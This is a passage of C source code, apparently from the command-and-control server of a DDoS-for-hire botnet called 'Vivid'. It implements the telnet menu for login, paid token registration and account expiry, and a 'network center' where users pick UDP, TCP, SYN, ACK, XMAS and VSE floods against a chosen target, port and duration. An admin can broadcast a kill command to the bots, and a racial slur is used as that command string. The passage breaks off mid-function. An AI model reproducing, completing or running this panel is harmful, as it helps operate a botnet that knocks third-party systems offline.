        if(send(vivfd, prmt, strlen(prmt), MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, vivfd) < 1) goto end;
        Trim(buf);
        if(!strcmp(buf, "1")) goto logscreen;
        else if(!strcmp(buf, "2")) goto registerscreen;
        else if(!strcmp(buf, "3")){ //Exit
            if(send(vivfd, tf, strlen(tf), MSG_NOSIGNAL) == -1) goto end;
            if(send(vivfd, ext1, strlen(ext1), MSG_NOSIGNAL) == -1) goto end;
            sprintf(vivid, "\t\t"R"Are You Sure You Want To Exit?(Y/N):");
            if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            if(fdgets(buf, sizeof buf, vivfd) < 1) goto end;
            Trim(buf);
            if(!strcmp(buf, "Y") || !strcmp(buf, "y") || !strcmp(buf, "YES") || !strcmp(buf, "yes")) goto goodbye;
            else
                goto aboutscreen;
        }
        else if(!strcmp(buf, "5") || !strcmp(buf, "MAIN MENU")) goto mainmenu;
        else{
            sprintf(vivid, "\r\n\t\t"R"'%s' Is Not A Valid Input!", buf);
            if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            memset(buf, 0, sizeof(buf));
            sleep(1);
            goto aboutscreen;
        }

        registerscreen:
        if(send(vivfd, tf, strlen(tf), MSG_NOSIGNAL) == -1) goto end;
        if(send(vivfd, reg1, strlen(reg1), MSG_NOSIGNAL) == -1) goto end;
        sprintf(vivid, "\t\t"CY"╔════════════════╗   ╔═════════════════╗\r\n\t\t║ R."Y"Redeem Token "CY"║   ║ T."Y"Need A Token? "CY"║\r\n\t\t╚════════════════╝   ╚═════════════════╝"CR"\r\n");
        if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
        shwprc:
        sprintf(vivid, "\r\n\t\t\t"CY"╔══╣"UND"Vivid"NUND"║\r\n"CR"\t\t\t"CY"╚═» ");
        if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, vivfd) < 1) goto end;
        Trim(buf);
        if(!strcmp(buf, "T") || !strcmp(buf, "t")){
            if(send(vivfd, pricing, strlen(pricing), MSG_NOSIGNAL) == -1) goto end;
            if(send(vivfd, ntown, strlen(ntown), MSG_NOSIGNAL) == -1) goto end;
            if(send(vivfd, cntin, strlen(cntin), MSG_NOSIGNAL) == -1) goto end;
            sprintf(vivid, ""CR"« B.Go Back  \t\t"CY"╔══╣"UND"Vivid"NUND"║\r\n"CR"« L.Log Out  \t\t"CY"╚═» ");
            if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            if(fdgets(buf, sizeof buf, vivfd) < 1) goto end;
            Trim(buf);
            if(!strcmp(buf, "B") || !strcmp(buf, "b")) goto mainmenu;
            else if(!strcmp(buf, "L") || !strcmp(buf, "l")) goto goodbye;
            else{
                sprintf(vivid, "\r\n\t\t"R"'%s' Is Not A Valid Input!", buf);
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                memset(buf, 0, sizeof(buf));
                sleep(1);
                goto shwprc;
            }
        }
        else if(!strcmp(buf, "R") || !strcmp(buf, "r")){
            sprintf(vivid, ""CY"Enter Token"Y": "CY"");
            if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            if(fdgets(buf, sizeof buf, vivfd) < 1) goto end;
            Trim(buf);
            char register_token [100];
            sprintf(register_token, "%s", buf);
            Trim(register_token);
            sprintf(vivid, ""Y"Validating Token"CY"...\r\n");
            if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            char ranswer[4];
            int find_token, answer, found = 0;
            find_token = TKNSearch(register_token);
            if(!strcmp(RTKNS[find_token].vivtkn, register_token)){
                snprintf(vivid, sizeof(vivid), ""G"Token is Valid For "Y" %s "CR"- "CY"Would You Like To Redeem?(Y/N): ", RTKNS[find_token].vivtexp);
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                found = 1;
                memset(buf, 0, sizeof(buf));
                while(fdgets(ranswer, sizeof ranswer, vivfd) < 1){
                    Trim(ranswer);
                    if(strlen(ranswer) < 3) continue;
                    break;
                }
                Trim(ranswer);
                if(!strcmp(ranswer, "Y") || !strcmp(ranswer, "y")){
                    answer = 1;
                    printf(""Y"[!!!] User Is Redeeming Token - %s [!!!]"CR"\n", register_token);
                }
                else
                    goto goodbye;
                memset(ranswer, 0, sizeof(ranswer));
            }
            if(!found){
                snprintf(vivid, sizeof(vivid), ""R"The Token "Y"%s "R"Does Not Exist In Our System. Goodbye...\r\n", register_token);
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                FILE *logFile;
                logFile = fopen(""LFD"/FAILED_LOGINS.log", "a");
                fprintf(logFile, "Invalid Token Used! %s - %s) [!!!]\n", management_ip, register_token);
                printf(""CY"["R"!!!"CY"] "Y"[REGISTRY] - "R"Invalid Token Used! "CY"("R"%s-%s"CY") "CY"["R"!!!"CY"]\n", management_ip, register_token);
                fclose(logFile);
                sleep(2);
                close(vivfd);
                goto end;
            }
            if(answer){
                char new_username[20];
                char new_password[20];
                char new_admin[20];
                char new_expire[15];
                int new_maxseconds = 0;
                reuser:
                sprintf(vivid, ""CY"Choose A Username"Y": ");
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                while(fdgets(new_username, sizeof new_username, vivfd) < 1){
                    Trim(new_username);
                    if(strlen(new_username) < 3) continue;
                    break;
                }
                Trim(new_username);
                int x;
                for(x=0; x < MXFDS; x++){
                    if(!strcmp(ACCS[x].vivu, new_username)){
                        sprintf(vivid, ""R"Sorry, The Username "Y"%s is Already Taken...\r\n", new_username);
                        if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                        goto reuser;
                    }
                }
                sprintf(vivid, ""CY"Choose A Password"Y": ");
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                while(fdgets(new_password, sizeof new_password, vivfd) < 1){
                    Trim(new_password);
                    if(strlen(new_password) < 3) continue;
                    break;
                }
                Trim(new_password);
                sprintf(new_admin, "%s", RTKNS[find_token].vivtadm);
                Trim(new_admin);
                sprintf(new_expire, "%s", RTKNS[find_token].vivtexp);
                TMUpdate(new_expire);
                new_maxseconds = RTKNS[find_token].vivtmxsc;
                snprintf(vivid, sizeof(vivid), "\r\n\t"G"Account Successfully Created!\r\n"CY"Your Account Expires On "Y"%s"CY"...\r\nClose And Reopen Terminal, And Log In Like Normal!", new_test_time);
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                FILE *auf = fopen(DB, "a");
                fprintf(auf, "%s %s %s %s %d\n", new_username, new_password, new_admin, new_test_time, new_maxseconds);
                fclose(auf);
                printf(""Y"[!!!]Token Redeemed(%s)-(%s %s %s %s %d)[!!!]"CR"\n", register_token, new_username, new_password, new_admin, new_test_time, new_maxseconds);
                RMSTR(RTKNS[find_token].vivtkn, TKNS);
                memset(new_username, 0, sizeof(new_username));
                memset(new_password, 0, sizeof(new_password));
                memset(new_admin, 0, sizeof(new_admin));
                memset(new_expire, 0, sizeof(new_expire));
                sleep(20);
                goto end;
            }
        }
        else if(!strcmp(buf, "1")) goto logscreen;
        else if(!strcmp(buf, "3")){ //Exit
            if(send(vivfd, tf, strlen(tf), MSG_NOSIGNAL) == -1) goto end;
            if(send(vivfd, ext1, strlen(ext1), MSG_NOSIGNAL) == -1) goto end;
            sprintf(vivid, "\t\t"R"Are You Sure You Want To Exit?(Y/N):");
            if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            if(fdgets(buf, sizeof buf, vivfd) < 1) goto end;
            Trim(buf);
            if(!strcmp(buf, "Y") || !strcmp(buf, "y") || !strcmp(buf, "YES") || !strcmp(buf, "yes")) goto goodbye;
            else
                goto registerscreen;
        }
        else if(!strcmp(buf, "4")) goto aboutscreen;
        else if(!strcmp(buf, "5")) goto mainmenu;
        else{
            sprintf(vivid, "\r\n\t\t"R"'%s' Is Not A Valid Input!", buf);
            if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            memset(buf, 0, sizeof(buf));
            sleep(1);
            goto registerscreen;
        }

        logscreen:
        memset(buf, 0, sizeof(buf));
        if(send(vivfd, sgn, strlen(sgn), MSG_NOSIGNAL) == -1) goto end;
        if(send(vivfd, lgn1, strlen(lgn1), MSG_NOSIGNAL) == -1) goto end;

        sprintf(vivid, "\r\n\t\t\t"CY"╔══╣\x1b[4mUsername\x1b[24m║\r\n\t\t\t╚═» ");
        if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, vivfd) < 1) goto end;
        Trim(buf);
        if(!strcmp(buf, "2")){ //Registry
            sprintf(vivid, ""CLS"");
            if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            if(send(vivfd, sgn, strlen(sgn), MSG_NOSIGNAL) == -1) goto end;
            if(send(vivfd, reg1, strlen(reg1), MSG_NOSIGNAL) == -1) goto end;
            sprintf(vivid, "\r\n\r\n\t\t\t"R"Go To Register?(Y/N):");
            if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            if(fdgets(buf, sizeof buf, vivfd) < 1) goto end;
            Trim(buf);
            if(!strcmp(buf, "Y") || !strcmp(buf, "y") || !strcmp(buf, "YES") || !strcmp(buf, "yes")) goto registerscreen;
            else
                goto logscreen;
        }
        if(!strcmp(buf, "3")){ //Exit
            if(send(vivfd, sgn, strlen(sgn), MSG_NOSIGNAL) == -1) goto end;
            if(send(vivfd, ext1, strlen(ext1), MSG_NOSIGNAL) == -1) goto end;
            sprintf(vivid, "\t\t"R"Are You Sure You Want To Exit?(Y/N):");
            if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            if(fdgets(buf, sizeof buf, vivfd) < 1) goto end;
            Trim(buf);
            if(!strcmp(buf, "Y") || !strcmp(buf, "y") || !strcmp(buf, "YES") || !strcmp(buf, "yes")) goto goodbye;
            else
                goto logscreen;
        }
        else if(!strcmp(buf, "4")) goto aboutscreen;
        else if(!strcmp(buf, "5")) goto mainmenu;

        sprintf(usrnms, buf);
        nckstrn = ("%s", buf);
        fnd = Search_in_File(nckstrn);
        int mynick;
        for(mynick=0; mynick < MXFDS; mynick++){
            if(!strcmp(MNGRS[mynick].nick, nckstrn)){
                char *kkkkeee = ""R"Error, User Is Already Logged In On This Network!\r\n";
                if(send(vivfd, kkkkeee, strlen(kkkkeee), MSG_NOSIGNAL) == -1) goto end;
                memset(buf, 0, sizeof(buf));
                sleep(5);
                close(vivfd);
                goto end;
            }
        }
        if(strcmp(nckstrn, ACCS[fnd].vivu) != 0) goto failed;
        Get_Time();
        snprintf(MNGRS[vivfd].vivex, sizeof(MNGRS[vivfd].vivex), "%s", ACCS[fnd].vivex);
        my_day = strtok(ACCS[fnd].vivex, "/");
        snprintf(my_month, sizeof(my_month), "%s", my_day+strlen(my_day)+1);
        snprintf(my_year, sizeof(my_year), "%s", strtok(ACCS[fnd].vivex, "/")+1+strlen(my_month)-2);
        char *my_exp_msg;
        if(atoi(year) > atoi(my_year) || atoi(day) > atoi(my_day) && atoi(month) >= atoi(my_month) && atoi(year) == atoi(my_year) || atoi(month) > atoi(my_month) && atoi(year) >= atoi(my_year)){
            if(send(vivfd, "\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
            my_exp_msg = "\t"R"Your "Y"Vivid"R" Account Has Expired, Message an Admin to Renew Subscription.\r\n\tContact Info Is In The About Tab Of The Main Menu\r\n"CR"";
            if(send(vivfd, my_exp_msg, strlen(my_exp_msg), MSG_NOSIGNAL) == -1) goto end;
            my_exp_msg = malloc(strlen(my_exp_msg));
            sleep(10);
            close(vivfd);
            goto end;
        }
        //Send Password
        if(send(vivfd, sgn, strlen(sgn), MSG_NOSIGNAL) == -1) goto end;
        if(strcmp(nckstrn, ACCS[fnd].vivu) == 0){    
        sprintf(vivid, "\r\n\r\n\t\t\t"CY"╔══╣\x1b[4mPassword\x1b[24m║\r\n\t\t\t╚═» ");
        if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, vivfd) < 1) return;
        Trim(buf);
        if(strcmp(buf, ACCS[fnd].vivp) != 0) goto failed;
        memset(buf, 0, 2048);
        goto noice;

        failed:
        if(send(vivfd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;
        if(send(vivfd, fuckoff, strlen(fuckoff), MSG_NOSIGNAL) == -1) goto end;
        FILE *logFile;
        logFile = fopen(""LFD"/FAILED_LOGINS.log", "a");
        fprintf(logFile, "Failed Login Attempt (%s)\n", management_ip);
        printf(""CY"["R"!!!"CY"] "R"Failed Login Attempt "CY"("R"%s-%s"CY") "CY"["R"!!!"CY"]\n", management_ip, buf);
        fclose(logFile);
        memset(buf, 0, 2048);
        sleep(10);
        close(vivfd);
        goto end;

        noice:
        UsersOnline ++;
        pthread_create(&title, NULL, &TitleWriter, vivfd);
        snprintf(MNGRS[vivfd].nick, "%s", ACCS[fnd].vivu);
        FILE *conlog = fopen(""LFD"/USER_CONNECTIONS.log", "a+");
        fprintf(conlog, "[%s] -> [%s]\n", management_ip, MNGRS[vivfd].nick);
        fclose(conlog);  
        if(!strcmp(ACCS[fnd].vivt, "admin")){
            MNGRS[vivfd].vivadm = 1;
            printf(VIVY" "CY"["G"Admin("CY"%s"G":"CY"%s"G")"CY"] "G"Logged In! "VIVY""CR"\n", MNGRS[vivfd].nick, management_ip);
        }
        else{
            MNGRS[vivfd].vivadm = 0;
            printf(VIVY" "CY"["G"User("CY"%s"G":"CY"%s"G")"CY"] "G"Logged In! "VIVY""CR"\n", MNGRS[vivfd].nick, management_ip);
        }
        MNGRS[vivfd].connd = 1;    
        MNGRS[vivfd].vivscs = ACCS[fnd].vivscs;                            
        MNGRS[vivfd].chat = 0;
        snprintf(MNGRS[vivfd].ip, sizeof(MNGRS[vivfd].ip), "%s", management_ip); //Store Our IP

        homescreen:
        sprintf(vivid, ""CLS"");
        if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
        if(strlen(wld_motd) > 0) //Detect If MOTD Is Not NULL
            if(send(vivfd, pr_motd, strlen(pr_motd), MSG_NOSIGNAL) == -1) goto end;
        if(send(vivfd, hm, strlen(hm), MSG_NOSIGNAL) == -1) goto end;
        sprintf(vivid, "     \t\t\t\t"CY"╔══╣"UND"Vivid"NUND"║\r\n\t\t\t\t╚═» ");
        if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, vivfd) < 1) goto end;
        Trim(buf);
        if(!strcmp(buf, "1")) goto networkcenter;
        else if(!strcmp(buf, "2")) goto serverroom;
        else if(!strcmp(buf, "3")) goto chatlobby;
        else if(!strcmp(buf, "4")) goto accounthub;
        else if(!strcmp(buf, "5")) goto helpcenter;
        else if(!strcmp(buf, "6")){
            if(MNGRS[vivfd].vivadm == 1) goto adminhub;
            else{
                sprintf(vivid, "\t\t"CY"["R"Permission Denied!"CY"]\r\n");
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                sleep(2);  
                goto homescreen;
            }
        }
        else if(!strcmp(buf, "L") || !strcmp(buf, "l")) goto goodbye;
        else{
            sprintf(vivid, "\r\n\t\t"R"'%s' Is Not A Valid Input!", buf);
            if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            memset(buf, 0, sizeof(buf));
            sleep(1);
            goto homescreen;
        }

        networkcenter: ;
        char ftype[100];
        char *mytarg[60];
        char *myport[60];
        char *mysecs[60];
        int atk_wtng = 0;
        memset(buf, 0, sizeof(buf));
        if(send(vivfd, nw, strlen(nw), MSG_NOSIGNAL) == -1) goto end;
        sprintf(vivid, "  \t\t\t\t"CY"╔══╣"UND"Vivid"NUND"║\r\n\t\t\t\t╚═» ");
        if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, vivfd) < 1) goto end;
        Trim(buf);
        if(!strcmp(buf, "1")){
            sprintf(ftype, "UDP");
            atk_wtng = 1;
        } else if(!strcmp(buf, "2")){
            sprintf(ftype, "TCP");
            atk_wtng = 2;
        } else if(!strcmp(buf, "3")){
            sprintf(ftype, "SYN");
            atk_wtng = 3;
        } else if(!strcmp(buf, "4")){
            sprintf(ftype, "ACK");
            atk_wtng = 4;
        } else if(!strcmp(buf, "5")){
            sprintf(ftype, "STD");
            atk_wtng = 5;
        } else if(!strcmp(buf, "6")){
            sprintf(ftype, "XMAS");
            atk_wtng = 6;
        } else if(!strcmp(buf, "7")){
            sprintf(ftype, "VSE");
            atk_wtng = 7;
        } else if(!strcmp(buf, "8")){ 
            sprintf(ftype, "CNC");
            atk_wtng = 8;
        }
        else if(!strcmp(buf, ""BOTTRIG" NIGGA")){ //Kill Cmd
            if(MNGRS[vivfd].vivadm == 1){
                Trim(buf);
                Broadcast(buf, vivfd, usrnms, 0, vivfd);
                sprintf(vivid, ""CY"["R"Attacks Killed!"CY"]\r\n");
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                sleep(2);
                goto networkcenter;
            }
            else{
                sprintf(vivid, ""R"Must Be Admin!\r\n");
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                sleep(2);
                goto networkcenter;
            }
        }
        if(atk_wtng > 0){
            startflood:
            memset(buf, 0, sizeof(buf));
            if(atk_wtng == 1){
                sprintf(vivid, ""CLS"\r\n\r\n"CR"« B.Go Back            \t"CY"╔═══════════════════════════╗╔════════╗\r\n"CR"« L.Log Out            \t"CY"║"CR"⣿⣿⣿⡿⢿⣿⣿⡿⢿⣿⣿⣿⡿⣿⣿⡿⣿⣿⣿⣿⣿⣿⠿⣿⠿⠿⣿"CY"║║ Target ║\r\n                   \t"CY"║"CR"⣿⣿⣿⠃⢸⣿⣿⡇⠈⣿⠿⣛⠅⢈⣴⣶⡄⠙⣿⣿⡿⣋⠀⣱⣶⡆⢹"CY"║╚════════╝\r\n                   \t"CY"║"CR"⣧⣨⠅⠀⣼⠿⡟⠀⠄⣵⣾⠏⠀⣜⣛⣽⡇⢀⢛⡵⢪⠁⢀⡬⠟⢀⣾"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⡏⢀⣼⣯⠊⠀⢈⣶⡬⡊⠀⣾⣿⣿⡟⢁⣆⠛⣩⠀⢠⣭⣵⣶⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⡇⢼⡿⢫⠀⣼⣿⣿⡜⠀⣦⡵⠖⣂⣤⣿⣽⡹⢿⢠⣷⣿⣿⣿⣿⣿"CY"║║ Port ║\r\n                   \t"CY"║"CR"⣿⣿⣶⣾⣿⣷⣶⣿⣿⣿⣷⣶⣾⣿⣿⣿⣿⣿⣿⣷⣾⣿⣿⣿⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⠛⠛⠛⠛⠛⣿⠛⠛⠛⠛⠛⠛⠛⣻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⡄⠀⢶⣶⡾⠁⠀⠰⣶⣶⡖⠀⣰⣿⣿⣿⣿⣿⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⡄⠈⠿⠁⢠⣷⡀⠙⣏⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Time ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⣀⣀⣀⣀⣀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⢿⣿⣿⣏⠀⢻⣿⠏⢀⣼⣿⣿⡿⢻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡇⠀⠙⢿⣿⣆⠀⠃⢀⣾⣿⡿⠋⠀⢸⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣧⣤⣤⣤⣽⣿⣧⢀⣾⣿⣯⣤⣤⣤⣼⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"╚═══════════════════════════╝"CR"\r\n                                "CY"╔══╣\x1b[4mTarget\x1b[24m║\r\n          \t\t\t╚═» ", mytarg, myport, mysecs);
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            } else if(atk_wtng == 2){
                sprintf(vivid, ""CLS"\r\n\r\n"CR"« B.Go Back            \t"CY"╔═══════════════════════════╗╔════════╗\r\n"CR"« L.Log Out            \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Target ║\r\n                   \t"CY"║"CR"⣿⣿⣿⡿⢿⠛⢛⣿⠿⢿⣿⣿⣿⢿⡿⢿⣿⣿⡿⣿⠿⢿⣿⣿⣿⣿⣿"CY"║╚════════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣧⣛⣛⣣⣾⡟⢀⣢⡤⢀⣴⣞⣣⠿⣫⠀⣵⣷⠈⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⡿⣫⡍⢀⢺⠋⣰⣿⡿⠟⡵⠏⠂⠰⣝⣡⣾⣿⣿⣿⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣇⢿⢀⣾⣿⠀⢫⡷⢟⣥⢶⡇⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Port ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣷⣾⣿⣽⣶⣶⣾⣿⣿⣿⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⠛⠛⠛⠛⠛⣿⠛⠛⠛⠛⠛⠛⠛⣻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⡄⠀⢶⣶⡾⠁⠀⠰⣶⣶⡖⠀⣰⣿⣿⣿⣿⣿⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⡄⠈⠿⠁⢠⣷⡀⠙⣏⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Time ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⣀⣀⣀⣀⣀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⢿⣿⣿⣏⠀⢻⣿⠏⢀⣼⣿⣿⡿⢻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡇⠀⠙⢿⣿⣆⠀⠃⢀⣾⣿⡿⠋⠀⢸⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣧⣤⣤⣤⣽⣿⣧⢀⣾⣿⣯⣤⣤⣤⣼⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"╚═══════════════════════════╝"CR"\r\n                                "CY"╔══╣\x1b[4mTarget\x1b[24m║\r\n          \t\t\t╚═» ", mytarg, myport, mysecs);
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            } else if(atk_wtng == 3){
                sprintf(vivid, ""CLS"\r\n\r\n"CR"« B.Go Back            \t"CY"╔═══════════════════════════╗╔════════╗\r\n"CR"« L.Log Out            \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Target ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⠟⢉⣭⢉⡌⢹⣿⣿⠙⣿⣿⡿⠉⢻⣿⣿⠙⣿⣿⣿"CY"║╚════════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⡿⠿⠏⡆⠈⣿⠏⢠⣾⣿⠏⢠⢟⣭⠎⢀⠎⣿⠃⢰⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⡏⡴⠿⢄⣷⠀⠋⢰⡿⠟⠁⡠⡇⠣⠁⠀⣾⢸⠃⣰⣿⣿⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⡷⢜⠰⠷⠂⣠⡕⣢⡌⢀⣶⣾⣧⡻⢠⣧⣿⣎⢰⣿⣿⣿⣿⣿"CY"║║ Port ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⠸⣿⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⠛⠛⠛⠛⠛⣿⠛⠛⠛⠛⠛⠛⠛⣻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⡄⠀⢶⣶⡾⠁⠀⠰⣶⣶⡖⠀⣰⣿⣿⣿⣿⣿⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⡄⠈⠿⠁⢠⣷⡀⠙⣏⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Time ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⣀⣀⣀⣀⣀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⢿⣿⣿⣏⠀⢻⣿⠏⢀⣼⣿⣿⡿⢻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡇⠀⠙⢿⣿⣆⠀⠃⢀⣾⣿⡿⠋⠀⢸⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣧⣤⣤⣤⣽⣿⣧⢀⣾⣿⣯⣤⣤⣤⣼⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"╚═══════════════════════════╝"CR"\r\n                                "CY"╔══╣\x1b[4mTarget\x1b[24m║\r\n          \t\t\t╚═» ", mytarg, myport, mysecs);
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            } else if(atk_wtng == 4){
